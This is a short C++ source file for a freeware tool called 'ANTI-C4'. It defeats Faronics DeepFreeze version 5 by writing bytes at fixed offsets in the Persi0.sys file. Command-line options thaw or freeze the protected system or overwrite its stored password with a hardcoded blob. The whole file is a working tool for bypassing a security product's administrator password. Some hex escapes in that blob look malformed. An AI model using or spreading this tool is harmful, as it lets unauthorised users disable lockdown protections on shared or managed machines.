/******************************************************
*****************    Date:17-04-05    *****************
*****************  Paul Elmachidis G. *****************
*****************  Greece - Salonica  *****************
******************************************************/

#include <iostream>
#include <fstream>
using namespace std;

const char* help="\n.::[ ANTI-C4 ZeRo Release ]::.\n\
Paul Elmachidis (C) All rights reserved 2005\n\
This utility supplied as FREEWARE.Feel free to use and distribute it.\
\nHave a nice hack!\n\n\
Remember: The goal of this program is changing the state of DeepFreeze(Vers.5)\nor(perhaps better)\
 erasing the password!\n\
As argument use:\n[+] - Thawing\n[-] - Frozening\n[!] - NULLing(Destroing) the password\n\
[?] - Help\n";

const char *ar_pwd="\x72\xC0\xC7\xD1\x40\xE5\xC6\x19\x4F\xAF\x44\x5C\x70\x4A\xAD\xF6\xE3\x74\
\x07\x71\xBB\x89\x2C\x19\xB3\xA3\xD4\x40\x15\x8D\x0E\xEA\xFE\xFE\x3D\x7B\xE1\xB9\xF7\x29\x18\
x0A\x13\x86\xA6\x6E\x05\xFD\xB3\x1B\x68\x92\x07\xD6\x98\xEA\xA7\x04\x4C\xBE\x78\x1F\xF4\xA5\x\
E2\x1F\xCB\x98\xD6\x98\x7C\xFB\x8C\xF5\x88\xB4\x41\x43\x9B\x02\xC1\x5D\x52\x6A\x13\x08\x9B\
x0A\x6F\x12\xE6\x7B\x14\xDE\x09\x3F\x13\x55\xED\x6A\xA1\xA1\xC2\x85\xAF\x7F\x61\xB7\xE1\x46\xDC\
\xCA\x17\x8C\xA4\x4A\xC6\x4E\x54\x8A\x87\x36\xFE\x99\xD6\x5F\x2E\x9F\x58\x28\xA9\x6F\xE9\x20";


 
int main(int argc,char* argv[])
{	
    char ch;
    if (argc == 1  ||  argc > 2)    // testing for options
	{ 
		cerr << "\nNothing for doing...Check the argument! \nType ? for Information" << endl;
		return 0;  
	}

    if (argv[1][0]=='?')            // if "?"..print help
	{	
	cout << help;	
	return 0;
	}	

	fstream fout("Persi0.sys");  // open the file (Persi0.sys <- same directory)
	if (fout.fail()) {           // exit if fails the opening of file
		cerr << "\nError in opening Persi0.sys.." << endl;
		return 0;     }
    fout.seekg(0xC4);            // find position
	
	if (argv[1][0]=='!')         // if...delete the password
	{
		cout << "Are you sure in deleting the password? [y/n] ";
        cin >> ch;
		if (ch=='y' || ch=='Y'){
		   fout.seekg(0x476);
		   fout << ar_pwd << endl;
		   cout << "\n>>> Password erased.Mission is done!" << endl;
		   exit(0);
		}   
		cout << "Mission aborted.\n";
		return 0;
	}

	if (argv[1][0]=='+')            // if... Thawing
	{	
    fout<< char(0x82) << char(0x91) << char (0x34)<< char (0x22);
	cout << "\nOperation Thawing...Successful!" << endl;
	exit(1);}
	
	if (argv[1][0]=='-')            // if... Frozening
	{
    fout << char(0x7D) << char(0x6E) << char(0xCB) << char(0xDD);
	cout << endl << "Operation Frozening...Successful!" << endl;
	exit(1);
	}	

	fout.close();                                              // close the file    
	cout << "\nFailed.No operation has been done..." << endl;  // Just a simple comment...
}